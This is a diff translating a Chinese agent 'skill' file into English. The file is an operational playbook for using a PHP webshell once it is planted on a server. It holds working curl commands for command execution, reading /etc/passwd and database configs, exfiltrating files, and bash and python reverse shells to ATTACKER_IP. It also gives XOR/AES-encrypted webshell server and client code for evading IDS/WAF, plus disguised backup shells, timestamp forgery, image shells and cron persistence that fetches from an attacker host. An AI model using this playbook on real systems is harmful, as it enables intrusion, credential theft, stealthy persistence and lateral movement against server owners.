@@ -1,94 +1,96 @@
 ---
 name: webshell-management
-description: "Webshell 部署后的 CLI 交互与深度利用。当 webshell 已经上传成功、需要通过 curl/python 执行命令、传输文件、建立加密通信、绕过 disable_functions/open_basedir、或做权限维持时使用。本 skill 与 webshell-deploy 互补——deploy 负责生成和上传 webshell，本 skill 负责上传成功后的所有操作。纯命令行操作，不依赖 GUI 工具"
+description: "CLI interaction and deep exploitation after webshell deployment. Use once a webshell has been uploaded successfully and you need to execute commands via curl/python, transfer files, establish encrypted communication, bypass disable_functions/open_basedir, or establish persistence. This skill complements webshell-deploy — deploy handles generating and uploading the webshell, while this skill handles every operation after a successful upload. Pure command-line operation, no GUI tools required"
+zh-signals: "Webshell 部署后的命令行交互与深度利用，涵盖命令执行、文件传输与权限维持。信号:Webshell,命令行交互,命令执行,加密通信,权限维持,绕过"
+when-to-use: "Use after a webshell has been uploaded and CLI-based interaction, command execution, file transfer, or persistence is needed."
 metadata:
-  tags: "webshell,交互,curl,加密shell,disable_functions,open_basedir,权限维持,文件操作,信息收集"
+  tags: "webshell,interaction,curl,encrypted shell,disable_functions,open_basedir,persistence,file operations,information gathering"
   category: "exploit"
 ---
 
-# Webshell 部署后 CLI 操作
+# CLI Operations After Webshell Deployment
 
-> **前置条件**：webshell 已部署到目标。本 skill 聚焦部署后的 CLI 交互与管理操作。
+> **Prerequisites**: The webshell has been deployed to the target. This skill focuses on CLI interaction and management operations after deployment.
 
-## Phase 1: curl 交互操作
+## Phase 1: curl Interaction
 
-### 1.1 命令执行
+### 1.1 Command Execution
 
 ```bash
-# system() 型: <?php system($_POST['c']);?>
+# system() type: <?php system($_POST['c']);?>
 curl -s -d "c=id" http://TARGET/shell.php
 curl -s --data-urlencode "c=cat /etc/passwd" http://TARGET/shell.php
 
-# eval() 型: <?php eval($_POST['c']);?>
+# eval() type: <?php eval($_POST['c']);?>
 curl -s -d "c=system('id');" http://TARGET/shell.php
 curl -s -d "c=echo file_get_contents('/etc/passwd');" http://TARGET/shell.php
 
-# GET 参数型: <?php system($_GET['c']);?>
+# GET parameter type: <?php system($_GET['c']);?>
 curl -s "http://TARGET/shell.php?c=id"
 ```
 
-### 1.2 文件操作
+### 1.2 File Operations
 
 ```bash
-# 读文件
+# Read a file
 curl -s -d "c=echo file_get_contents('/etc/passwd');" http://TARGET/shell.php
 
-# 写文件（部署第二个 webshell）
+# Write a file (deploy a second webshell)
 curl -s --data-urlencode "c=file_put_contents('/var/www/html/.config.php','<?php system(\$_POST[\"x\"]);?>');" http://TARGET/shell.php
 
-# 下载文件到攻击机（base64 传输避免二进制问题）
+# Download a file to the attacker machine (base64 transfer avoids binary issues)
 curl -s -d "c=echo base64_encode(file_get_contents('/app/config/database.yml'));" http://TARGET/shell.php | base64 -d > database.yml
 
-# 上传文件到目标
+# Upload a file to the target
 B64=$(base64 -w0 local_tool.elf)
 curl -s --data-urlencode "c=file_put_contents('/tmp/tool',base64_decode('$B64'));chmod('/tmp/tool',0755);" http://TARGET/shell.php
 
-# 搜索敏感文件
+# Search for sensitive files
 curl -s -d "c=system('find / -name \"*.conf\" -o -name \".env\" -o -name \"*password*\" 2>/dev/null | head -20');" http://TARGET/shell.php
 ```
 
-### 1.3 信息收集
+### 1.3 Information Gathering
 
 ```bash
-# 系统信息
+# System information
 curl -s -d "c=system('uname -a; id; hostname; ip addr');" http://TARGET/shell.php
 
-# 内网探测
+# Internal network probing
 curl -s -d "c=system('cat /etc/hosts; arp -a; ip route');" http://TARGET/shell.php
 
-# 数据库凭据搜索
+# Database credential search
 curl -s -d "c=system('find / -name \"*.php\" -exec grep -l \"mysql_connect\|mysqli\|PDO\" {} \; 2>/dev/null | head -10');" http://TARGET/shell.php
 
-# PHP 配置
+# PHP configuration
 curl -s -d "c=phpinfo();" http://TARGET/shell.php | grep -i "document_root\|server_addr\|disable_functions"
 ```
 
-### 1.4 反弹交互式 Shell
+### 1.4 Reverse Interactive Shell
 
-webshell 不稳定且功能有限，应尽快升级到交互式 shell：
+A webshell is unstable and limited, so upgrade to an interactive shell as soon as possible:
 
 ```bash
-# bash 反弹
+# bash reverse shell
 curl -s --data-urlencode "c=system('bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"');" http://TARGET/shell.php
 
-# python 反弹
+# python reverse shell
 curl -s --data-urlencode "c=system('python3 -c \"import os,socket,subprocess;s=socket.socket();s.connect((\\\"ATTACKER_IP\\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\"bash\\\",\\\"-i\\\"])\"');" http://TARGET/shell.php
 
-# 出站受限时——探测可出端口
+# Outbound restricted — probe reachable egress ports
 for port in 80 443 53 8080 8443; do
   curl -s --data-urlencode "c=system('timeout 2 bash -c \"echo >/dev/tcp/ATTACKER_IP/$port\" 2>&1 && echo \"$port OPEN\" || echo \"$port CLOSED\"');" http://TARGET/shell.php
 done
 ```
 
-## Phase 2: 加密通信
+## Phase 2: Encrypted Communication
 
-明文 webshell 流量容易被 IDS/WAF 检测。部署加密 shell 后用 Python 客户端交互。
+Plaintext webshell traffic is easily detected by IDS/WAF. After deploying an encrypted shell, interact through the Python client.
 
-### 2.1 XOR 加密（服务端 + 客户端）
+### 2.1 XOR Encryption (Server + Client)
 
 ```php
 <?php
-// 服务端: xshell.php
+// Server: xshell.php
 $key = 'k3y_s3cr3t';
 $data = file_get_contents('php://input');
 $decoded = '';
@@ -106,7 +108,7 @@ echo $encrypted;
 
 ```python
 #!/usr/bin/env python3
-"""XOR webshell CLI 客户端"""
+"""XOR webshell CLI client"""
 import requests, sys
 
 URL = "http://TARGET/xshell.php"
@@ -128,11 +130,11 @@ if __name__ == "__main__":
         print(execute(cmd))
 ```
 
-### 2.2 AES 加密（服务端 + 客户端）
+### 2.2 AES Encryption (Server + Client)
 
 ```php
 <?php
-// 服务端: ashell.php — AES-128-CBC
+// Server: ashell.php — AES-128-CBC
 $key = md5('my_secret_key_1');
 $iv = substr($key, 0, 16);
 $data = file_get_contents('php://input');
@@ -147,7 +149,7 @@ echo base64_encode($encrypted);
 
 ```python
 #!/usr/bin/env python3
-"""AES webshell CLI 客户端"""
+"""AES webshell CLI client"""
 import requests, hashlib, base64
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
@@ -172,52 +174,52 @@ if __name__ == "__main__":
         print(execute(cmd))
 ```
 
-## Phase 3: 绕过 PHP 限制
+## Phase 3: Bypass PHP Restrictions
 
-> 这里只做快速检测，确认需要绕过后参考具体绕过技术。
+> Only perform quick detection here; after confirming that a bypass is needed, refer to the specific bypass techniques.
 
 ```bash
-# 检查 disable_functions
+# Check disable_functions
 curl -s -d "c=echo ini_get('disable_functions');" http://TARGET/shell.php
 
-# 检查 open_basedir
+# Check open_basedir
 curl -s -d "c=echo ini_get('open_basedir');" http://TARGET/shell.php
 
-# 如果有限制 → 参考 php-bypass skill 的 Phase 1/Phase 2 执行绕过
+# If restrictions exist → refer to Phase 1/Phase 2 of the php-bypass skill to execute the bypass
 ```
 
-## Phase 4: 权限维持
+## Phase 4: Persistence
 
 ```bash
-# 多点 webshell（不同路径、不同密码、伪装文件名）
+# Multi-location webshell (different paths, different passwords, disguised filenames)
 curl -s --data-urlencode "c=file_put_contents('/var/www/html/css/style.php','<?php \$_GET[\"f\"](\$_GET[\"c\"]);?>');" http://TARGET/shell.php
 
-# 时间戳伪装（与同目录正常文件一致）
+# Timestamp camouflage (consistent with the normal files in the same directory)
 curl -s -d "c=system('touch -r /var/www/html/index.php /var/www/html/css/style.php');" http://TARGET/shell.php
 
-# 图片马（追加到正常图片 + .htaccess 解析）
+# Image shell (appended to a normal image + .htaccess parsing)
 curl -s --data-urlencode "c=file_put_contents('/var/www/html/img/.htaccess','AddType application/x-httpd-php .jpg');" http://TARGET/shell.php
 curl -s --data-urlencode "c=system('echo \"<?php system(\\\$_GET[c]);?>\" >> /var/www/html/img/logo.jpg');" http://TARGET/shell.php
 
-# cron 持久化
+# cron persistence
 curl -s --data-urlencode "c=system('(crontab -l 2>/dev/null; echo \"*/5 * * * * curl http://ATTACKER/shell.php -o /var/www/html/.bak.php\") | crontab -');" http://TARGET/shell.php
 ```
 
-## 决策树
+## Decision Tree
 
 ```
-webshell 已部署（由 webshell-deploy 完成）
-├── 确认 shell 类型（system 型 / eval 型）→ Phase 1.1 测试
-├── 检查环境限制
-│   ├── disable_functions → Phase 3.1 LD_PRELOAD/FFI 绕过
-│   ├── open_basedir → Phase 3.2 glob/chdir 绕过
-│   └── WAF 检测流量 → Phase 2 部署 XOR/AES 加密 shell
-├── 信息收集 → Phase 1.3（系统/网络/数据库凭据）
-├── 尝试反弹 shell → Phase 1.4
-│   ├── 出站开放 → bash/python 反弹
-│   └── 出站受限 → 扫描可出端口 / 继续用 webshell
-├── 权限维持 → Phase 4
-│   ├── 多点 webshell + 时间戳伪装
-│   └── Java 目标 → 内存马（→ ../webshell-deploy/references/memory-webshell.md）
-└── 横向移动 → 内网探测 + 数据库凭据 + 端口转发
+The webshell is deployed (completed by webshell-deploy)
+├── Confirm the shell type (system type / eval type) → Phase 1.1 test
+├── Check environment restrictions
+│   ├── disable_functions → Phase 3.1 LD_PRELOAD/FFI bypass
+│   ├── open_basedir → Phase 3.2 glob/chdir bypass
+│   └── WAF detects the traffic → Phase 2 deploy an XOR/AES encrypted shell
+├── Information gathering → Phase 1.3 (system/network/database credentials)
+├── Attempt a reverse shell → Phase 1.4
+│   ├── Outbound open → bash/python reverse shell
+│   └── Outbound restricted → scan reachable egress ports / keep using the webshell
+├── Persistence → Phase 4
+│   ├── Multi-location webshell + timestamp camouflage
+│   └── Java target → in-memory shell (→ ../webshell-deploy/references/memory-webshell.md)
+└── Lateral movement → internal network probing + database credentials + port forwarding
 ```
